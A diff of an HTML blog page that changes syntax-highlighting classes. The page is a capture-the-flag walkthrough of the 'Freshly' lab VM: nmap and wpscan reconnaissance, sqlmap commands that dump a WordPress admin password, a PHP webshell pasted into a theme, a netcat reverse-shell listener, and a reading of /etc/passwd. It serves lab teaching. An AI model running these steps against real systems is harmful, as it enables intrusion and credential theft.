@@ -5,6 +5,7 @@
 		<meta charset="utf-8" />
 		<link rel="profile" href="http://gmpg.org/xfn/11" />
 		<link rel="stylesheet" type="text/css" href="/theme/css/style.css" />
+        <link rel="stylesheet" type="text/css" href="/theme/css/pygments.css" />
 		<link rel='stylesheet' id='oswald-css'  href='http://fonts.googleapis.com/css?family=Oswald&#038;ver=3.3.2' type='text/css' media='all' />
 		<style type="text/css">
 			body.custom-background { background-color: #f5f5f5; }
@@ -56,34 +57,34 @@ The goal of this challenge is to break into the machine via
 the web and find the secret hidden in a sensitive file.</blockquote>
 <p>Go grab the image and follow along.</p>
 <p>First I need to determine the image's IP address and what services it is running:</p>
-<div class="highlight"><pre><span></span><span class="gp">root@kali:~#</span> nmap -sn 192.168.56.0/24
+<div class="highlight"><pre><span></span><span class="hllgp">root@kali:~#</span> nmap -sn 192.168.56.0/24
 
-<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST</span>
-<span class="go">Nmap scan report for 192.168.56.1</span>
-<span class="go">Host is up (0.00019s latency).</span>
-<span class="go">MAC Address: 0A:00:27:00:00:00 (Unknown)</span>
-<span class="go">Nmap scan report for 192.168.56.100</span>
-<span class="go">Host is up (0.00088s latency).</span>
-<span class="go">MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)</span>
-<span class="go">Nmap scan report for 192.168.56.103</span>
-<span class="go">Host is up (0.00036s latency).</span>
-<span class="go">MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)</span>
-<span class="go">Nmap scan report for 192.168.56.102</span>
-<span class="go">Host is up.</span>
-<span class="go">Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds</span>
-<span class="gp">root@kali:~#</span> nmap -p- 192.168.56.103
+<span class="hllgo">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST</span>
+<span class="hllgo">Nmap scan report for 192.168.56.1</span>
+<span class="hllgo">Host is up (0.00019s latency).</span>
+<span class="hllgo">MAC Address: 0A:00:27:00:00:00 (Unknown)</span>
+<span class="hllgo">Nmap scan report for 192.168.56.100</span>
+<span class="hllgo">Host is up (0.00088s latency).</span>
+<span class="hllgo">MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)</span>
+<span class="hllgo">Nmap scan report for 192.168.56.103</span>
+<span class="hllgo">Host is up (0.00036s latency).</span>
+<span class="hllgo">MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)</span>
+<span class="hllgo">Nmap scan report for 192.168.56.102</span>
+<span class="hllgo">Host is up.</span>
+<span class="hllgo">Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds</span>
+<span class="hllgp">root@kali:~#</span> nmap -p- 192.168.56.103
 
-<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST</span>
-<span class="go">Nmap scan report for 192.168.56.103</span>
-<span class="go">Host is up (0.00026s latency).</span>
-<span class="go">Not shown: 65532 closed ports</span>
-<span class="go">PORT     STATE SERVICE</span>
-<span class="go">80/tcp   open  http</span>
-<span class="go">443/tcp  open  https</span>
-<span class="go">8080/tcp open  http-proxy</span>
-<span class="go">MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)</span>
+<span class="hllgo">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST</span>
+<span class="hllgo">Nmap scan report for 192.168.56.103</span>
+<span class="hllgo">Host is up (0.00026s latency).</span>
+<span class="hllgo">Not shown: 65532 closed ports</span>
+<span class="hllgo">PORT     STATE SERVICE</span>
+<span class="hllgo">80/tcp   open  http</span>
+<span class="hllgo">443/tcp  open  https</span>
+<span class="hllgo">8080/tcp open  http-proxy</span>
+<span class="hllgo">MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)</span>
 
-<span class="go">Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds</span>
+<span class="hllgo">Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds</span>
 </pre></div>
 <p>So I can see the host is at <code>192.168.56.103</code> and has ports <em>80, 443, and 8080</em>
 open. Browsing to the address presents an animated gif.</p>
@@ -102,78 +103,78 @@ non <em>https</em> version of the wordpress site. I'm going to use that instead
 of the <em>https</em> version to avoid any certificate issues and generally make life
 a bit easier.</p>
 <p>Using <code>wpscan</code> I can find out which of the installed plugins have vulnerabilities.</p>
-<div class="highlight"><pre><span></span><span class="gp">root@kali:~#</span> wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
-<span class="go">_______________________________________________________________</span>
-<span class="go">        __          _______   _____</span>
-<span class="go">        \ \        / /  __ \ / ____|</span>
-<span class="go">         \ \  /\  / /| |__) | (___   ___  __ _ _ __</span>
-<span class="go">          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \</span>
-<span class="go">           \  /\  /  | |     ____) | (__| (_| | | | |</span>
-<span class="go">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>
+<div class="highlight"><pre><span></span><span class="hllgp">root@kali:~#</span> wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
+<span class="hllgo">_______________________________________________________________</span>
+<span class="hllgo">        __          _______   _____</span>
+<span class="hllgo">        \ \        / /  __ \ / ____|</span>
+<span class="hllgo">         \ \  /\  / /| |__) | (___   ___  __ _ _ __</span>
+<span class="hllgo">          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \</span>
+<span class="hllgo">           \  /\  /  | |     ____) | (__| (_| | | | |</span>
+<span class="hllgo">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>
 
-<span class="go">        WordPress Security Scanner by the WPScan Team</span>
-<span class="go">                       Version 2.6</span>
-<span class="go">          Sponsored by Sucuri - https://sucuri.net</span>
-<span class="go">   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</span>
-<span class="go">_______________________________________________________________</span>
+<span class="hllgo">        WordPress Security Scanner by the WPScan Team</span>
+<span class="hllgo">                       Version 2.6</span>
+<span class="hllgo">          Sponsored by Sucuri - https://sucuri.net</span>
+<span class="hllgo">   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</span>
+<span class="hllgo">_______________________________________________________________</span>
 
-<span class="go">[+] URL: http://192.168.56.103:8080/wordpress/</span>
-<span class="go">[+] Started: Fri Apr 10 18:42:00 2015</span>
+<span class="hllgo">[+] URL: http://192.168.56.103:8080/wordpress/</span>
+<span class="hllgo">[+] Started: Fri Apr 10 18:42:00 2015</span>
 
-<span class="go">[!] The WordPress &#39;http://192.168.56.103:8080/wordpress/readme.html&#39; file exists exposing a version number</span>
-<span class="go">[!] Full Path Disclosure (FPD) in: &#39;http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php&#39;</span>
-<span class="go">[+] Interesting header: SERVER: Apache</span>
-<span class="go">[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN</span>
-<span class="go">[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php</span>
+<span class="hllgo">[!] The WordPress &#39;http://192.168.56.103:8080/wordpress/readme.html&#39; file exists exposing a version number</span>
+<span class="hllgo">[!] Full Path Disclosure (FPD) in: &#39;http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php&#39;</span>
+<span class="hllgo">[+] Interesting header: SERVER: Apache</span>
+<span class="hllgo">[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN</span>
+<span class="hllgo">[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php</span>
 
-<span class="go">[+] WordPress version 4.1 identified from meta generator</span>
+<span class="hllgo">[+] WordPress version 4.1 identified from meta generator</span>
 
-<span class="go">[+] Enumerating installed plugins (only vulnerable ones) ...</span>
+<span class="hllgo">[+] Enumerating installed plugins (only vulnerable ones) ...</span>
 
-<span class="go">   Time: 00:01:40 &lt;============================================&gt; (952 / 952) 100.00% Time: 00:01:40</span>
+<span class="hllgo">   Time: 00:01:40 &lt;============================================&gt; (952 / 952) 100.00% Time: 00:01:40</span>
 
-<span class="go">[+] We found 4 plugins:</span>
+<span class="hllgo">[+] We found 4 plugins:</span>
 
-<span class="go">[+] Name: cart66-lite - v1.5.3</span>
-<span class="go"> |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/</span>
-<span class="go"> |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt</span>
+<span class="hllgo">[+] Name: cart66-lite - v1.5.3</span>
+<span class="hllgo"> |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/</span>
+<span class="hllgo"> |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt</span>
 
-<span class="go">[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection</span>
-<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7737</span>
-<span class="go">    Reference: https://research.g0blin.co.uk/g0blin-00022/</span>
-<span class="go">    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442</span>
-<span class="go">[i] Fixed in: 1.5.4</span>
+<span class="hllgo">[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection</span>
+<span class="hllgo">    Reference: https://wpvulndb.com/vulnerabilities/7737</span>
+<span class="hllgo">    Reference: https://research.g0blin.co.uk/g0blin-00022/</span>
+<span class="hllgo">    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442</span>
+<span class="hllgo">[i] Fixed in: 1.5.4</span>
 
-<span class="go">[+] Name: google-analytics-for-wordpress - v5.3.1</span>
-<span class="go"> |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/</span>
-<span class="go"> |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt</span>
+<span class="hllgo">[+] Name: google-analytics-for-wordpress - v5.3.1</span>
+<span class="hllgo"> |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/</span>
+<span class="hllgo"> |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt</span>
 
-<span class="go">[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)</span>
-<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7838</span>
-<span class="go">    Reference: http://packetstormsecurity.com/files/130716/</span>
-<span class="go">    Reference: http://osvdb.org/119334</span>
+<span class="hllgo">[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)</span>
+<span class="hllgo">    Reference: https://wpvulndb.com/vulnerabilities/7838</span>
+<span class="hllgo">    Reference: http://packetstormsecurity.com/files/130716/</span>
+<span class="hllgo">    Reference: http://osvdb.org/119334</span>
 
-<span class="go">[+] Name: proplayer - v4.7.9.1</span>
-<span class="go"> |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/</span>
-<span class="go"> |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt</span>
+<span class="hllgo">[+] Name: proplayer - v4.7.9.1</span>
+<span class="hllgo"> |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/</span>
+<span class="hllgo"> |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt</span>
 
-<span class="go">[!] Title: ProPlayer 4.7.9.1 - SQL Injection</span>
-<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/6912</span>
-<span class="go">    Reference: http://osvdb.org/93564</span>
-<span class="go">    Reference: http://www.exploit-db.com/exploits/25605/</span>
+<span class="hllgo">[!] Title: ProPlayer 4.7.9.1 - SQL Injection</span>
+<span class="hllgo">    Reference: https://wpvulndb.com/vulnerabilities/6912</span>
+<span class="hllgo">    Reference: http://osvdb.org/93564</span>
+<span class="hllgo">    Reference: http://www.exploit-db.com/exploits/25605/</span>
 
-<span class="go">[+] Name: wptouch - v3.6.6</span>
-<span class="go"> |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/</span>
-<span class="go"> |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt</span>
+<span class="hllgo">[+] Name: wptouch - v3.6.6</span>
+<span class="hllgo"> |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/</span>
+<span class="hllgo"> |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt</span>
 
-<span class="go">[!] Title: WPtouch &lt;= 3.6.6 - Unvalidated Open Redirect</span>
-<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7837</span>
-<span class="go">    Reference: https://wordpress.org/plugins/wptouch/changelog/</span>
-<span class="go">[i] Fixed in: 3.7</span>
+<span class="hllgo">[!] Title: WPtouch &lt;= 3.6.6 - Unvalidated Open Redirect</span>
+<span class="hllgo">    Reference: https://wpvulndb.com/vulnerabilities/7837</span>
+<span class="hllgo">    Reference: https://wordpress.org/plugins/wptouch/changelog/</span>
+<span class="hllgo">[i] Fixed in: 3.7</span>
 
-<span class="go">[+] Finished: Fri Apr 10 18:43:48 2015</span>
-<span class="go">[+] Memory used: 9.027 MB</span>
-<span class="go">[+] Elapsed time: 00:01:48</span>
+<span class="hllgo">[+] Finished: Fri Apr 10 18:43:48 2015</span>
+<span class="hllgo">[+] Memory used: 9.027 MB</span>
+<span class="hllgo">[+] Elapsed time: 00:01:48</span>
 </pre></div>
 <p>There's a few there, so I'll look at each on in turn to see how easy it is to
 exploit, and what it might yield.</p>
@@ -217,22 +218,22 @@ first. This is what lies at the end of that URL</p>
 <p>I could just start attacking this with various SQLi strings, but the
 beauty of attacking a virtual machine is that I can use tools without the fear
 of breaking someone else's stuff. Roll out <code>sqlmap</code> and let's see what we can find:</p>
-<div class="highlight"><pre><span></span><span class="gp">root@kali:~#</span> sqlmap  -u <span class="s2">&quot;192.168.56.103/login.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span>
+<div class="highlight"><pre><span></span><span class="hllgp">root@kali:~#</span> sqlmap  -u <span class="hlls2">&quot;192.168.56.103/login.php&quot;</span> --data<span class="hllo">=</span><span class="hlls2">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span>
 
-<span class="go">&lt;snip&gt;</span>
+<span class="hllgo">&lt;snip&gt;</span>
 
-<span class="go">POST parameter &#39;user&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y</span>
+<span class="hllgo">POST parameter &#39;user&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y</span>
 
-<span class="go">&lt;snip&gt;</span>
+<span class="hllgo">&lt;snip&gt;</span>
 
-<span class="go">POST parameter &#39;password&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y</span>
+<span class="hllgo">POST parameter &#39;password&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y</span>
 
-<span class="go">&lt;snip&gt;</span>
+<span class="hllgo">&lt;snip&gt;</span>
 
-<span class="go">[12:17:03] [INFO] the back-end DBMS is MySQL</span>
-<span class="go">web server operating system: Linux Ubuntu</span>
-<span class="go">web application technology: Apache 2.4.7, PHP 5.5.9</span>
-<span class="go">back-end DBMS: MySQL 5.0.11</span>
+<span class="hllgo">[12:17:03] [INFO] the back-end DBMS is MySQL</span>
+<span class="hllgo">web server operating system: Linux Ubuntu</span>
+<span class="hllgo">web application technology: Apache 2.4.7, PHP 5.5.9</span>
+<span class="hllgo">back-end DBMS: MySQL 5.0.11</span>
 </pre></div>
 <p>I've removed some of the output for clarity, but I can see
 that there's possibility of a blind SQL injection for both <code>user</code> and
@@ -242,32 +243,32 @@ what tables there are and if we can find any useful information.</p>
 <p>First I'll get a list of databases on the system. This process takes a little while,
 so when it asks &quot;<em>do you want sqlmap to try to optimize value(s) for DBMS delay
 responses (option '--time-sec')? [Y/n]</em>&quot; answer <em>YES</em>. It will be done quicker.</p>
-<div class="highlight"><pre><span></span><span class="gp">root@kali:~#</span> sqlmap  -u <span class="s2">&quot;192.168.56.103/login.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span> --dbms<span class="o">=</span>mysql --dbs
+<div class="highlight"><pre><span></span><span class="hllgp">root@kali:~#</span> sqlmap  -u <span class="hlls2">&quot;192.168.56.103/login.php&quot;</span> --data<span class="hllo">=</span><span class="hlls2">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span> --dbms<span class="hllo">=</span>mysql --dbs
 
-<span class="go">&lt;snip&gt;</span>
+<span class="hllgo">&lt;snip&gt;</span>
 
-<span class="go">[12:20:19] [INFO] fetching database names</span>
-<span class="go">[12:20:19] [INFO] fetching number of databases</span>
-<span class="go">[12:20:19] [INFO] retrieved: 7</span>
-<span class="go">[12:20:21] [INFO] retrieved: information_schema</span>
-<span class="go">[12:21:36] [INFO] retrieved: login</span>
-<span class="go">[12:21:59] [INFO] retrieved: mysql</span>
-<span class="go">[12:22:20] [INFO] retrieved: performance_schema</span>
-<span class="go">[12:23:33] [INFO] retrieved: phpmyadmin</span>
-<span class="go">[12:24:18] [INFO] retrieved: users</span>
-<span class="go">[12:24:43] [INFO] retrieved: wordpress8080</span>
-<span class="go">available databases [7]:</span>
-<span class="go">[*] information_schema</span>
-<span class="go">[*] login</span>
-<span class="go">[*] mysql</span>
-<span class="go">[*] performance_schema</span>
-<span class="go">[*] phpmyadmin</span>
-<span class="go">[*] users</span>
-<span class="go">[*] wordpress8080</span>
+<span class="hllgo">[12:20:19] [INFO] fetching database names</span>
+<span class="hllgo">[12:20:19] [INFO] fetching number of databases</span>
+<span class="hllgo">[12:20:19] [INFO] retrieved: 7</span>
+<span class="hllgo">[12:20:21] [INFO] retrieved: information_schema</span>
+<span class="hllgo">[12:21:36] [INFO] retrieved: login</span>
+<span class="hllgo">[12:21:59] [INFO] retrieved: mysql</span>
+<span class="hllgo">[12:22:20] [INFO] retrieved: performance_schema</span>
+<span class="hllgo">[12:23:33] [INFO] retrieved: phpmyadmin</span>
+<span class="hllgo">[12:24:18] [INFO] retrieved: users</span>
+<span class="hllgo">[12:24:43] [INFO] retrieved: wordpress8080</span>
+<span class="hllgo">available databases [7]:</span>
+<span class="hllgo">[*] information_schema</span>
+<span class="hllgo">[*] login</span>
+<span class="hllgo">[*] mysql</span>
+<span class="hllgo">[*] performance_schema</span>
+<span class="hllgo">[*] phpmyadmin</span>
+<span class="hllgo">[*] users</span>
+<span class="hllgo">[*] wordpress8080</span>
 
-<span class="go">[12:25:44] [INFO] fetched data logged to text files under &#39;/root/.sqlmap/output/192.168.56.103&#39;</span>
+<span class="hllgo">[12:25:44] [INFO] fetched data logged to text files under &#39;/root/.sqlmap/output/192.168.56.103&#39;</span>
 
-<span class="go">[*] shutting down at 12:25:44</span>
+<span class="hllgo">[*] shutting down at 12:25:44</span>
 </pre></div>
 <p>It found seven databases, amongst which is an interesting one: <code>wordpress8080</code>.
 This seems to be the wordpress database, so I can start attacking that and see
@@ -275,28 +276,28 @@ if I can get the <em>admin</em> account. The <code>login</code> and <code>users<
 interesting, so let's take a look at those later. Additionally, if I can get
 a login, especially an <em>admin</em> one, I could try to exploit the plugins later on.
 After all, it does say there are multiple ways into this VM.</p>
-<div class="highlight"><pre><span></span><span class="gp">root@kali:~#</span> sqlmap  -u <span class="s2">&quot;192.168.56.103/login.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span> --dbms<span class="o">=</span>mysql --tables -D wordpress8080
+<div class="highlight"><pre><span></span><span class="hllgp">root@kali:~#</span> sqlmap  -u <span class="hlls2">&quot;192.168.56.103/login.php&quot;</span> --data<span class="hllo">=</span><span class="hlls2">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span> --dbms<span class="hllo">=</span>mysql --tables -D wordpress8080
 
-<span class="go">&lt;snip&gt;</span>
+<span class="hllgo">&lt;snip&gt;</span>
 
-<span class="go">Database: wordpress8080</span>
-<span class="go">[1 table]</span>
-<span class="go">+-------+</span>
-<span class="go">| users |</span>
-<span class="go">+-------+</span>
+<span class="hllgo">Database: wordpress8080</span>
+<span class="hllgo">[1 table]</span>
+<span class="hllgo">+-------+</span>
+<span class="hllgo">| users |</span>
+<span class="hllgo">+-------+</span>
 
-<span class="gp">root@kali:~#</span> sqlmap  -u <span class="s2">&quot;192.168.56.103/login.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span> --dbms<span class="o">=</span>mysql --dump -T users -D wordpress8080
+<span class="hllgp">root@kali:~#</span> sqlmap  -u <span class="hlls2">&quot;192.168.56.103/login.php&quot;</span> --data<span class="hllo">=</span><span class="hlls2">&quot;user=1&amp;password=1&amp;s=Submit&quot;</span> --dbms<span class="hllo">=</span>mysql --dump -T users -D wordpress8080
 
-<span class="go">&lt;snip&gt;</span>
+<span class="hllgo">&lt;snip&gt;</span>
 
-<span class="go">Database: wordpress8080</span>
-<span class="go">Table: users</span>
-<span class="go">[1 entry]</span>
-<span class="go">+----------+---------------------+</span>
-<span class="go">| username | password            |</span>
-<span class="go">+----------+---------------------+</span>
-<span class="go">| admin    | SuperSecretPassword |</span>
-<span class="go">+----------+---------------------+</span>
+<span class="hllgo">Database: wordpress8080</span>
+<span class="hllgo">Table: users</span>
+<span class="hllgo">[1 entry]</span>
+<span class="hllgo">+----------+---------------------+</span>
+<span class="hllgo">| username | password            |</span>
+<span class="hllgo">+----------+---------------------+</span>
+<span class="hllgo">| admin    | SuperSecretPassword |</span>
+<span class="hllgo">+----------+---------------------+</span>
 </pre></div>
 <p>The admin password for the wordpress site, excellent. As for the other tables,
 I didn't find anything useful in them, so I won't post the output here. In that case
@@ -307,42 +308,42 @@ Alright then... <code>cd /usr/share/webshells/php</code> and I'm going to use th
 <p>To do that I need to edit the theme in the admin section, and just
 paste in the contents. The I need to open a listening <code>netcat</code> session and
 browse to a non-existant page on the site.</p>
-<div class="highlight"><pre><span></span><span class="gp">root@kali:/usr/share/webshells/php#</span> nc -lvnp 1337
-<span class="go">listening on [any] 1337 ...</span>
-<span class="go">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875</span>
-<span class="go">Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux</span>
-<span class="go"> 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05</span>
-<span class="go">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
-<span class="go">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span>
-<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
-<span class="gp">$</span> <span class="nb">cd</span> /etc
-<span class="gp">$</span> cat passwd
-<span class="go">root:x:0:0:root:/root:/bin/bash</span>
-<span class="go">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
-<span class="go">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
-<span class="go">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
-<span class="go">sync:x:4:65534:sync:/bin:/bin/sync</span>
-<span class="go">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
-<span class="go">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
-<span class="go">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
-<span class="go">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
-<span class="go">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
-<span class="go">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
-<span class="go">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
-<span class="go">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
-<span class="go">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
-<span class="go">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
-<span class="go">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
-<span class="go">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
-<span class="go">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
-<span class="go">libuuid:x:100:101::/var/lib/libuuid:</span>
-<span class="go">syslog:x:101:104::/home/syslog:/bin/false</span>
-<span class="go">messagebus:x:102:105::/var/run/dbus:/bin/false</span>
-<span class="go">user:x:1000:1000:user,,,:/home/user:/bin/bash</span>
-<span class="go">mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false</span>
-<span class="go">candycane:x:1001:1001::/home/candycane:</span>
-<span class="gp">#</span> YOU STOLE MY SECRET FILE!
-<span class="gp">#</span> <span class="nv">SECRET</span> <span class="o">=</span> <span class="s2">&quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span>
+<div class="highlight"><pre><span></span><span class="hllgp">root@kali:/usr/share/webshells/php#</span> nc -lvnp 1337
+<span class="hllgo">listening on [any] 1337 ...</span>
+<span class="hllgo">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875</span>
+<span class="hllgo">Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux</span>
+<span class="hllgo"> 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05</span>
+<span class="hllgo">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
+<span class="hllgo">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span>
+<span class="hllgo">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="hllgp">$</span> <span class="hllnb">cd</span> /etc
+<span class="hllgp">$</span> cat passwd
+<span class="hllgo">root:x:0:0:root:/root:/bin/bash</span>
+<span class="hllgo">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="hllgo">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span class="hllgo">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
+<span class="hllgo">sync:x:4:65534:sync:/bin:/bin/sync</span>
+<span class="hllgo">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
+<span class="hllgo">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
+<span class="hllgo">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
+<span class="hllgo">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
+<span class="hllgo">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
+<span class="hllgo">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
+<span class="hllgo">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
+<span class="hllgo">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span class="hllgo">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
+<span class="hllgo">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
+<span class="hllgo">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
+<span class="hllgo">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
+<span class="hllgo">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
+<span class="hllgo">libuuid:x:100:101::/var/lib/libuuid:</span>
+<span class="hllgo">syslog:x:101:104::/home/syslog:/bin/false</span>
+<span class="hllgo">messagebus:x:102:105::/var/run/dbus:/bin/false</span>
+<span class="hllgo">user:x:1000:1000:user,,,:/home/user:/bin/bash</span>
+<span class="hllgo">mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false</span>
+<span class="hllgo">candycane:x:1001:1001::/home/candycane:</span>
+<span class="hllgp">#</span> YOU STOLE MY SECRET FILE!
+<span class="hllgp">#</span> <span class="hllnv">SECRET</span> <span class="hllo">=</span> <span class="hlls2">&quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span>
 </pre></div>
 <p>I had to poke around the file system a bit to find this, but <code>/etc/passwd</code> is
 usually a <em>go-to</em> file if you get access to a system. Otherwise I'd still
